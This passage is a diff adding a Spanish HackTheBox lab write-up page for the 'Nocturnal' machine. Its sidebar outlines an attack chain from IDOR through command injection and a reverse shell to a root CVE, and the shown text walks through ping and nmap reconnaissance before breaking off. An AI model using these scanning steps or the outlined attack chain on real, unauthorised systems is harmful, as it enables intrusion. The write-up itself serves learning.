@@ -1,0 +1,1630 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Nocturnal — HackTheBox Writeup | Brandeiks</title>
+  <meta name="description" content="Writeup de la máquina Nocturnal de HackTheBox — Dificultad: Fácil. nmap → /etc/hosts → registro → IDOR view.php → wfuzz usuarios → ODT credenciales → command injection backup → reverse shell → SQLite hashes → CrackStation → SSH tobias → SSH tunneling → ISPConfig CVE-2023-46818 → root.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg:        #050a0e;
+      --bg2:       #080f14;
+      --bg3:       #0a1520;
+      --green:     #00ff88;
+      --cyan:      #00e5ff;
+      --red:       #ff2d55;
+      --yellow:    #ffd700;
+      --orange:    #ff8c00;
+      --purple:    #bf5fff;
+      --dim:       #1a2a2e;
+      --text:      #c8d8e0;
+      --text-dim:  #4a6a74;
+      --font-mono: 'Share Tech Mono', monospace;
+      --font-main: 'Rajdhani', sans-serif;
+      --font-disp: 'Orbitron', sans-serif;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-main);
+      overflow-x: hidden;
+      cursor: none;
+    }
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 2px,
+        rgba(0,255,136,0.012) 2px, rgba(0,255,136,0.012) 4px
+      );
+      pointer-events: none; z-index: 1000;
+    }
+
+    /* CURSOR */
+    a, button { cursor: none; }
+    .cursor {
+      position: fixed; width: 10px; height: 10px;
+      background: var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9999;
+      transform: translate(-50%,-50%);
+      box-shadow: 0 0 12px var(--green); opacity: 0;
+    }
+    .cursor-ring {
+      position: fixed; width: 36px; height: 36px;
+      border: 1px solid var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9998;
+      transform: translate(-50%,-50%); opacity: 0;
+      transition: all 0.12s ease;
+    }
+
+    /* NAV */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 500;
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 1.2rem 4rem;
+      background: rgba(5,10,14,0.92); backdrop-filter: blur(10px);
+      border-bottom: 1px solid rgba(0,255,136,0.08);
+    }
+    .nav-logo { font-family: var(--font-disp); font-size: 1rem; color: var(--green); letter-spacing: 4px; text-decoration: none; }
+    .nav-back { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); text-decoration: none; letter-spacing: 2px; transition: color 0.3s; }
+    .nav-back::before { content: '← '; }
+    .nav-back:hover { color: var(--green); }
+
+    /* HERO */
+    .writeup-hero {
+      min-height: 42vh; display: flex; align-items: flex-end;
+      padding: 8rem 4rem 3rem; position: relative; overflow: hidden;
+      border-bottom: 1px solid var(--dim);
+    }
+    .hero-grid {
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+      background-size: 60px 60px;
+    }
+    .hero-glow {
+      position: absolute; width: 600px; height: 400px;
+      background: radial-gradient(ellipse, rgba(191,95,255,0.07) 0%, transparent 70%);
+      top: 0; left: 0; pointer-events: none;
+    }
+    .writeup-hero-content { position: relative; z-index: 2; max-width: 900px; }
+    .breadcrumb { font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 1.2rem; }
+    .breadcrumb a { color: var(--text-dim); text-decoration: none; transition: color 0.2s; }
+    .breadcrumb a:hover { color: var(--green); }
+    .breadcrumb span { color: var(--green); }
+    .writeup-title { font-family: var(--font-disp); font-size: clamp(2.5rem, 6vw, 4.5rem); font-weight: 900; letter-spacing: 2px; line-height: 1.1; }
+    .writeup-title span { color: var(--green); }
+    .writeup-subtitle { font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-dim); margin-top: 0.8rem; letter-spacing: 1px; }
+    .writeup-meta { display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; margin-top: 1.8rem; }
+    .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
+    .badge-facil   { color: #00ffcc;  border-color: rgba(0,255,204,0.4);  background: rgba(0,255,204,0.05); }
+    .badge-htb     { color: var(--green); border-color: rgba(0,255,136,0.4);  background: rgba(0,255,136,0.05); }
+    .badge-linux   { color: var(--yellow); border-color: rgba(255,215,0,0.3);  background: rgba(255,215,0,0.05); }
+    .badge-idor    { color: var(--red);    border-color: rgba(255,45,85,0.4);   background: rgba(255,45,85,0.05); }
+    .badge-cmdinj  { color: var(--orange); border-color: rgba(255,140,0,0.4);   background: rgba(255,140,0,0.05); }
+    .badge-ssh     { color: var(--cyan);   border-color: rgba(0,229,255,0.3);   background: rgba(0,229,255,0.05); }
+    .badge-cve     { color: var(--purple); border-color: rgba(191,95,255,0.35); background: rgba(191,95,255,0.05); }
+    .meta-date { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+
+    /* LAYOUT */
+    .writeup-layout {
+      display: grid; grid-template-columns: 1fr 240px;
+      gap: 3rem; max-width: 1300px; margin: 0 auto; padding: 4rem;
+    }
+
+    /* SIDEBAR */
+    .sidebar { position: sticky; top: 5rem; height: fit-content; order: 2; }
+    .sidebar-box { border: 1px solid var(--dim); padding: 1.5rem; background: var(--bg2); margin-bottom: 1.5rem; }
+    .sidebar-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--green); letter-spacing: 3px; margin-bottom: 1.2rem; }
+    .toc-list { list-style: none; display: flex; flex-direction: column; gap: 0.4rem; }
+    .toc-list a {
+      font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim);
+      text-decoration: none; letter-spacing: 1px; transition: all 0.2s;
+      display: block; padding: 0.25rem 0.8rem;
+      border-left: 2px solid transparent;
+    }
+    .toc-list a:hover { color: var(--green); border-left-color: var(--green); }
+    .toc-list a.active { color: var(--green); border-left-color: var(--green); opacity: 1; }
+    .info-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem; }
+    .info-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 1px; }
+    .info-val { font-family: var(--font-mono); font-size: 0.72rem; }
+    .val-green  { color: var(--green); }
+    .val-cyan   { color: var(--cyan); }
+    .val-yellow { color: var(--yellow); }
+    .val-red    { color: var(--red); }
+    .val-purple { color: var(--purple); }
+    .val-facil  { color: #00ffcc; }
+
+    /* ATTACK PATH */
+    .attack-path { display: flex; flex-direction: column; gap: 0; }
+    .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
+    .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
+    .ap-line { width: 1px; height: 16px; background: rgba(0,255,136,0.2); margin: 0 3.5px; }
+    .ap-text { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); line-height: 1.5; }
+    .ap-text span { color: var(--cyan); }
+
+    /* CONTENT */
+    .writeup-content { min-width: 0; order: 1; }
+
+    /* PROGRESS BAR */
+    .progress-container { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: transparent; z-index: 1001; }
+    .progress-bar { height: 100%; background: var(--green); width: 0%; transition: width 0.15s ease; box-shadow: 0 0 8px var(--green); }
+
+    /* SKIP LINK */
+    .skip-link { position: absolute; top: -40px; left: 0; background: var(--green); color: var(--bg); padding: 8px 16px; z-index: 10000; text-decoration: none; font-family: var(--font-mono); font-size: 0.8rem; transition: top 0.2s; }
+    .skip-link:focus { top: 0; }
+
+    /* COPY BUTTON */
+    .copy-btn {
+      position: absolute; top: 0.5rem; right: 4.5rem;
+      background: var(--dim); border: 1px solid rgba(0,255,136,0.3);
+      color: var(--text-dim); font-family: var(--font-mono);
+      font-size: 0.62rem; padding: 0.15rem 0.5rem; letter-spacing: 1px;
+      cursor: none; opacity: 0; transition: opacity 0.2s, background 0.2s, color 0.2s;
+      z-index: 10; white-space: nowrap;
+    }
+    .cmd-block:hover .copy-btn { opacity: 1; }
+    .copy-btn:hover { background: var(--green); color: var(--bg); border-color: var(--green); }
+    .copy-btn.copied { background: var(--green); color: var(--bg); border-color: var(--green); opacity: 1; }
+
+    /* TOAST */
+    .toast {
+      position: fixed; bottom: 24px; right: 24px;
+      background: var(--green); color: #000;
+      padding: 0.7rem 1.4rem; font-family: var(--font-mono);
+      font-size: 0.75rem; letter-spacing: 2px; font-weight: 600;
+      opacity: 0; transform: translateY(8px);
+      transition: opacity 0.25s, transform 0.25s;
+      pointer-events: none; z-index: 10000;
+    }
+    .toast.show { opacity: 1; transform: translateY(0); }
+
+    /* SECTIONS */
+    .section { margin-bottom: 4rem; opacity: 0; transform: translateY(20px); transition: opacity 0.5s ease, transform 0.5s ease; }
+    .section.visible { opacity: 1; transform: translateY(0); }
+    .section-label { font-family: var(--font-mono); font-size: 0.68rem; color: var(--green); letter-spacing: 4px; margin-bottom: 0.5rem; }
+    .section-title { font-family: var(--font-disp); font-size: 1.5rem; font-weight: 700; letter-spacing: 2px; margin-bottom: 0.6rem; }
+    .section-line { width: 40px; height: 2px; background: var(--green); margin-bottom: 2rem; }
+
+    /* PROSE */
+    .prose p { font-size: 1.05rem; line-height: 1.9; color: var(--text-dim); margin-bottom: 1rem; }
+    .prose p strong { color: var(--text); }
+    .prose p .hl       { color: var(--green); font-weight: bold; }
+    .prose p .hl-cyan  { color: var(--cyan); }
+    .prose p .hl-red   { color: var(--red); }
+    .prose p .hl-yel   { color: var(--yellow); }
+    .prose p .hl-pur   { color: var(--purple); }
+    .prose p .hl-ora   { color: var(--orange); }
+
+    /* STEP */
+    .step-marker { display: flex; align-items: center; gap: 1rem; margin-bottom: 1.2rem; margin-top: 2.5rem; }
+    .step-num { font-family: var(--font-disp); font-size: 0.65rem; color: var(--bg); background: var(--green); width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: 900; }
+    .step-title { font-family: var(--font-mono); font-size: 0.8rem; color: var(--green); letter-spacing: 2px; }
+
+    /* CMD BLOCK */
+    .cmd-block {
+      background: var(--bg3); border: 1px solid rgba(0,229,255,0.15);
+      border-left: 3px solid var(--cyan); padding: 1rem 1.2rem;
+      margin: 1rem 0; font-family: var(--font-mono); font-size: 0.82rem;
+      overflow-x: auto; position: relative; line-height: 1.8;
+    }
+    .cmd-block .cmd-label { position: absolute; top: 0.5rem; right: 0.8rem; font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; }
+    .cmd-block .prompt { color: var(--green); user-select: none; }
+    .cmd-block .prompt-root { color: var(--red); user-select: none; }
+    .cmd-block .cmd    { color: var(--text); }
+    .cmd-block .flag   { color: var(--cyan); }
+    .cmd-block .arg    { color: var(--yellow); }
+    .cmd-block .comment { color: var(--text-dim); font-size: 0.75rem; }
+
+    /* OUTPUT */
+    .output-block {
+      background: #020608; border: 1px solid var(--dim);
+      padding: 1rem 1.2rem; margin: 0.5rem 0 1.5rem;
+      font-family: var(--font-mono); font-size: 0.77rem;
+      line-height: 1.9; color: var(--text-dim); overflow-x: auto;
+    }
+    .output-block .o-green  { color: var(--green); }
+    .output-block .o-cyan   { color: var(--cyan); }
+    .output-block .o-red    { color: var(--red); }
+    .output-block .o-yellow { color: var(--yellow); }
+    .output-block .o-white  { color: var(--text); }
+    .output-block .o-purple { color: var(--purple); }
+    .output-block .o-orange { color: var(--orange); }
+
+    /* INFO BOXES */
+    .info-box { border: 1px solid rgba(0,229,255,0.2); background: rgba(0,229,255,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .info-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--cyan); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .info-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .info-box p strong { color: var(--cyan); }
+
+    .warn-box { border: 1px solid rgba(255,140,0,0.25); background: rgba(255,140,0,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .warn-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--orange); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .warn-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .warn-box p strong { color: var(--orange); }
+
+    .vuln-box { border: 1px solid rgba(255,45,85,0.3); background: rgba(255,45,85,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .vuln-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--red); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .vuln-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .vuln-box p strong { color: var(--red); }
+
+    /* CRED BOX */
+    .cred-box { border: 1px solid rgba(0,255,136,0.25); background: rgba(0,255,136,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; display: flex; gap: 2rem; flex-wrap: wrap; }
+    .cred-item .cred-label { font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 0.3rem; }
+    .cred-item .cred-val   { font-family: var(--font-mono); font-size: 0.95rem; color: var(--green); }
+
+    /* VULN TABLE */
+    .vuln-table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    .vuln-table th, .vuln-table td { font-family: var(--font-mono); font-size: 0.72rem; padding: 0.8rem 1rem; text-align: left; border-bottom: 1px solid var(--dim); }
+    .vuln-table th { color: var(--cyan); letter-spacing: 2px; border-bottom-color: rgba(0,229,255,0.2); }
+    .vuln-table td { color: var(--text-dim); }
+    .vuln-table td:first-child { color: var(--green); }
+
+    /* DIVIDER */
+    hr.divider { border: none; height: 1px; background: linear-gradient(90deg, rgba(0,255,136,0.3), transparent); margin: 3rem 0; }
+
+    /* CMD REF */
+    .cmd-ref-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.2rem; margin-top: 1.5rem; }
+    .cmd-ref-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.5rem; transition: border-color 0.3s; }
+    .cmd-ref-card:hover { border-color: rgba(0,229,255,0.25); }
+    .cmd-ref-name { font-family: var(--font-mono); font-size: 0.9rem; color: var(--cyan); margin-bottom: 0.5rem; letter-spacing: 1px; }
+    .cmd-ref-syntax { font-family: var(--font-mono); font-size: 0.72rem; color: var(--green); background: var(--bg3); padding: 0.4rem 0.7rem; margin-bottom: 0.8rem; display: inline-block; }
+    .cmd-ref-desc { font-size: 0.92rem; color: var(--text-dim); line-height: 1.7; margin-bottom: 0.8rem; }
+    .cmd-ref-flags { list-style: none; display: flex; flex-direction: column; gap: 0.3rem; }
+    .cmd-ref-flags li { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+    .cmd-ref-flags li span { color: var(--yellow); }
+
+    /* GLOSARIO */
+    .glosario-grid { display: grid; grid-template-columns: 1fr; gap: 1rem; margin-top: 1.5rem; }
+    .glos-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.4rem 1.5rem; transition: border-color 0.3s; }
+    .glos-card:hover { border-color: rgba(0,229,255,0.2); }
+    .glos-term { font-family: var(--font-mono); font-size: 0.88rem; color: var(--cyan); margin-bottom: 0.4rem; letter-spacing: 1px; }
+    .glos-def { font-size: 0.95rem; color: var(--text-dim); line-height: 1.75; }
+    .glos-def strong { color: var(--green); }
+    .glos-def code { color: var(--yellow); font-family: var(--font-mono); font-size: 0.85em; }
+
+    /* FOOTER */
+    footer {
+      border-top: 1px solid var(--dim); padding: 3rem 4rem;
+      text-align: center; font-family: var(--font-mono); font-size: 0.72rem;
+      color: var(--text-dim); letter-spacing: 2px; line-height: 2;
+    }
+    footer span { color: var(--green); }
+
+    @media (max-width: 900px) {
+      .writeup-layout { grid-template-columns: 1fr; padding: 2rem; }
+      .sidebar { position: static; order: -1; }
+      nav { padding: 1rem 2rem; }
+      .writeup-hero { padding: 6rem 2rem 2rem; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+<a href="#main" class="skip-link">Skip to content</a>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+
+<nav>
+  <a href="#" class="nav-logo">BRANDEIKS</a>
+  <a href="#" class="nav-back">WRITEUPS</a>
+</nav>
+
+<!-- HERO -->
+<section class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <div class="breadcrumb">
+      <a href="#">HOME</a> / <a href="#">WRITEUPS</a> / <a href="#">HACKTHEBOX</a> / <span>NOCTURNAL</span>
+    </div>
+    <h1 class="writeup-title">NOCT<span>URNAL</span></h1>
+    <p class="writeup-subtitle">// HackTheBox · Linux · Fácil · IDOR + Command Injection + CVE-2023-46818</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-facil">FÁCIL</span>
+      <span class="meta-badge badge-idor">IDOR</span>
+      <span class="meta-badge badge-cmdinj">CMD INJECTION</span>
+      <span class="meta-badge badge-ssh">SSH TUNNEL</span>
+      <span class="meta-badge badge-cve">CVE-2023-46818</span>
+      <span class="meta-date">// 2026-05-19</span>
+    </div>
+  </div>
+</section>
+
+<div class="writeup-layout">
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// TABLA DE CONTENIDO</p>
+      <ul class="toc-list">
+        <li><a href="#recon">01 · Reconocimiento</a></li>
+        <li><a href="#hosts">02 · /etc/hosts</a></li>
+        <li><a href="#web">03 · Aplicación Web</a></li>
+        <li><a href="#idor">04 · IDOR · Enumeración</a></li>
+        <li><a href="#creds">05 · Credenciales Amanda</a></li>
+        <li><a href="#admin">06 · Panel de Admin</a></li>
+        <li><a href="#cmdinj">07 · Command Injection</a></li>
+        <li><a href="#shell">08 · Reverse Shell</a></li>
+        <li><a href="#db">09 · SQLite · Hashes</a></li>
+        <li><a href="#ssh">10 · SSH como Tobias</a></li>
+        <li><a href="#tunnel">11 · SSH Tunneling</a></li>
+        <li><a href="#isp">12 · ISPConfig CVE</a></li>
+        <li><a href="#root">13 · Root</a></li>
+        <li><a href="#cmdref">14 · Referencia Comandos</a></li>
+        <li><a href="#glosario">15 · Glosario</a></li>
+      </ul>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO MÁQUINA</p>
+      <div class="info-row"><span class="info-label">NOMBRE</span><span class="info-val val-purple">Nocturnal</span></div>
+      <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux</span></div>
+      <div class="info-row"><span class="info-label">DIFICULTAD</span><span class="info-val val-facil">Fácil</span></div>
+      <div class="info-row"><span class="info-label">IP</span><span class="info-val val-cyan">10.129.6.36</span></div>
+      <div class="info-row"><span class="info-label">DOMINIO</span><span class="info-val val-green">nocturnal.htb</span></div>
+      <div class="info-row"><span class="info-label">PUERTOS</span><span class="info-val val-cyan">22, 80</span></div>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ATTACK PATH</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">nmap → <span>22, 80</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">/etc/hosts → <span>nocturnal.htb</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">Registro test:123</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>IDOR</span> view.php</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">wfuzz → <span>admin, amanda, tobias</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">privacy.odt → creds <span>amanda</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Cmd Injection</span> backup</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">Reverse shell → <span>www-data</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">SQLite → hashes → <span>tobias</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">SSH Tunnel → <span>ISPConfig :8080</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>CVE-2023-46818</span> → root</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- MAIN CONTENT -->
+  <main id="main" class="writeup-content">
+
+    <!-- ===================== 01 RECON ===================== -->
+    <div class="section" id="recon">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">VERIFICAR CONECTIVIDAD — PING</span>
+      </div>
+      <div class="prose">
+        <p>
+          El primer paso siempre es verificar que la máquina objetivo está activa y tiene conectividad
+          con nuestra interfaz de red VPN de HackTheBox. Para eso usamos <span class="hl">ping</span>
+          con el flag <span class="hl-cyan">-c 3</span> que limita el envío a solo 3 paquetes ICMP
+          (sin ese flag el ping sería infinito). El objetivo es confirmar que la IP
+          <span class="hl-yel">10.129.6.36</span> responde antes de gastar tiempo escaneando.
+        </p>
+        <p>
+          Un <strong>TTL de 63</strong> en la respuesta es una pista importante: los sistemas Linux
+          suelen responder con TTL 64, y al pasar por un hop de red baja a 63. Si hubiera sido 127–128,
+          estaríamos ante Windows. Esto nos da una primera confirmación de que es Linux, lo que
+          coincide con la descripción de la máquina.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="ping 10.129.6.36 -c 3">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PING</span>
+        <div><span class="prompt">$ </span><span class="cmd">ping <span class="arg">10.129.6.36</span> <span class="flag">-c</span> <span class="arg">3</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>PING 10.129.6.36 (10.129.6.36) 56(84) bytes of data.</div>
+        <div><span class="o-green">64 bytes from 10.129.6.36:</span> icmp_seq=1 <span class="o-yellow">ttl=63</span> time=121 ms</div>
+        <div><span class="o-green">64 bytes from 10.129.6.36:</span> icmp_seq=2 <span class="o-yellow">ttl=63</span> time=120 ms</div>
+        <div><span class="o-green">64 bytes from 10.129.6.36:</span> icmp_seq=3 <span class="o-yellow">ttl=63</span> time=118 ms</div>
+        <div>&nbsp;</div>
+        <div>--- 10.129.6.36 ping statistics ---</div>
+        <div><span class="o-green">3 packets transmitted, 3 received, 0% packet loss</span>, time 2008ms</div>
+        <div>rtt min/avg/max/mdev = 118.359/120.012/121.321/1.233 ms</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">ESCANEO COMPLETO CON NMAP</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con conectividad confirmada, lanzamos un escaneo exhaustivo con <span class="hl">nmap</span>.
+          Desglosando cada flag del comando:
+        </p>
+        <p>
+          <span class="hl-cyan">-p-</span> escanea los <strong>65,535 puertos TCP</strong>
+          en lugar de solo los 1,000 más comunes. Muchos servicios interesantes corren en puertos
+          no estándar y se pierden con un escaneo básico. Es más lento pero no deja nada sin revisar.
+        </p>
+        <p>
+          <span class="hl-cyan">-sSCV</span> es la combinación de tres flags: <strong>-sS</strong>
+          (SYN scan, el más sigiloso — envía solo el paquete SYN sin completar el handshake TCP,
+          más rápido y menos ruidoso que un connect scan), <strong>-sC</strong> (ejecuta los scripts
+          por defecto de NSE — Nmap Scripting Engine — que detectan configuraciones, banners y
+          vulnerabilidades básicas), y <strong>-sV</strong> (detecta la versión exacta del servicio
+          en cada puerto abierto). La razón de combinarlos es que con una sola pasada obtenemos
+          puertos, servicios y scripts sin hacer múltiples escaneos.
+        </p>
+        <p>
+          <span class="hl-cyan">-n</span> desactiva la resolución DNS. Cuando nmap intenta resolver
+          IPs a nombres de dominio, añade latencia. En un entorno de laboratorio esto es innecesario
+          y ralentiza el escaneo.
+        </p>
+        <p>
+          <span class="hl-cyan">-Pn</span> deshabilita el ping previo al escaneo (host discovery).
+          Por defecto nmap primero comprueba si el host está activo. En algunas máquinas HTB el
+          firewall bloquea ICMP pero los puertos están abiertos: sin <code style="color:var(--yellow);font-family:var(--font-mono)">-Pn</code>
+          nmap asumiría que el host está caído y no escanearía. Ya verificamos conectividad con ping
+          manualmente, así que lo omitimos con seguridad.
+        </p>
+        <p>
+          <span class="hl-cyan">--min-rate=5000</span> fuerza a nmap a enviar al menos
+          <strong>5,000 paquetes por segundo</strong>. Acelera significativamente el escaneo de
+          65,535 puertos, pasando de varios minutos a menos de un minuto. Aceptable en entornos
+          de laboratorio.
+        </p>
+        <p>
+          <span class="hl-cyan">--open</span> muestra solo los puertos en estado abierto, filtrando
+          los cerrados y filtrados para que la salida sea limpia y fácil de analizar.
+        </p>
+        <p>
+          <span class="hl-cyan">-oX nocturnal.xml</span> guarda los resultados en formato XML.
+          Este formato estructurado permite transformarlo después con herramientas como
+          <code style="color:var(--yellow);font-family:var(--font-mono)">xsltproc</code> en un HTML
+          visual y legible, útil para reportes.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 10.129.6.36 -oX nocturnal.xml">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">ESCANEO</span>
+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p-</span> <span class="flag">-sSCV</span> <span class="flag">-n</span> <span class="flag">-Pn</span> <span class="flag">--min-rate=5000</span> <span class="flag">--open</span> <span class="arg">10.129.6.36</span> <span class="flag">-oX</span> <span class="arg">nocturnal.xml</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-19 16:52 -0400</div>
+        <div>Nmap scan report for 10.129.6.36</div>
+        <div>Host is up (2.4s latency).</div>
+        <div>Not shown: 36394 closed tcp ports (reset), 29139 filtered tcp ports (no-response)</div>
+        <div>PORT&nbsp;&nbsp;&nbsp; STATE SERVICE VERSION</div>
+        <div><span class="o-green">22/tcp</span>  open  ssh&nbsp;&nbsp;&nbsp; <span class="o-cyan">OpenSSH 8.2p1</span> Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)</div>
+        <div><span class="o-green">80/tcp</span>  open  http&nbsp;&nbsp; <span class="o-cyan">nginx 1.18.0</span> (Ubuntu)</div>
+        <div>|_http-title: Did not follow redirect to http://nocturnal.htb/</div>
+        <div>|_http-server-header: nginx/1.18.0 (Ubuntu)</div>
+        <div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+        <div>&nbsp;</div>
+        <div>Nmap done: 1 IP address (1 host up) scanned in 45.62 seconds</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ANÁLISIS DE RESULTADOS</p>
+        <p>
+          Solo <strong>2 puertos abiertos</strong>: <strong>22 (SSH)</strong> con OpenSSH 8.2p1 y
+          <strong>80 (HTTP)</strong> con nginx 1.18.0. La línea crítica es
+          <strong>http-title: Did not follow redirect to http://nocturnal.htb/</strong> — nmap detectó
+          que el servidor redirige a un dominio virtual <strong>nocturnal.htb</strong>, no a la IP.
+          Esto nos indica que el servidor usa <strong>Virtual Hosting</strong> y necesitamos configurar
+          nuestro sistema para resolver ese dominio antes de acceder al sitio.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">CONVERTIR RESULTADOS NMAP A HTML</span>
+      </div>
+      <div class="prose">
+        <p>
+          <span class="hl">xsltproc</span> es un procesador de hojas de estilo XSLT. Nmap incluye
+          una hoja de estilo (<code style="color:var(--yellow);font-family:var(--font-mono)">/usr/share/nmap/nmap.xsl</code>)
+          que transforma el XML de salida en un HTML tabular con colores, legible en cualquier
+          navegador. Esto es especialmente útil para incluir en reportes o para revisar resultados
+          de escaneos grandes de forma cómoda.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl nocturnal.xml > nocturnal.html">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">XSLT</span>
+        <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">nocturnal.xml</span> &gt; <span class="arg">nocturnal.html</span></span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 02 HOSTS ===================== -->
+    <div class="section" id="hosts">
+      <p class="section-label">// 02</p>
